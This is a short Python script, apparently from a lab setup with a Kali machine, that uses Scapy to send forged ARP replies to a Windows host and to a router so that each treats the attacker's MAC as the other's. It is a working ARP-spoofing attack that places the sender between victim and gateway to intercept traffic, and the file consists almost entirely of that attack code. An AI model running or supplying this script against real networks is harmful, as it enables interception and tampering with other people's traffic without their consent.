#!/usr/bin/python3

from scapy.all import *


def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.129" # windows IP
    arp_response.hwdst = "00:0C:29:BE:47:14"    #windows mac
    arp_response.hwsrc = "00:0c:29:90:79:02"  #kali mac
    arp_response.psrc = "192.168.74.2"  #fake field value
    send(arp_response)


def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.2"  # router'sIP
    arp_response.hwdst = "00:50:56:ff:74:8b" # router's mac
    arp_response.hwsrc = "00:0c:29:90:79:02" #kali's mac
    arp_response.psrc = "192.168.74.129" # fake pretending to be device A
    send(arp_response)


#if __name__ == "__main__":
spoof_victim()
spoof_router()
























######### Automaticaly Created Script /##########
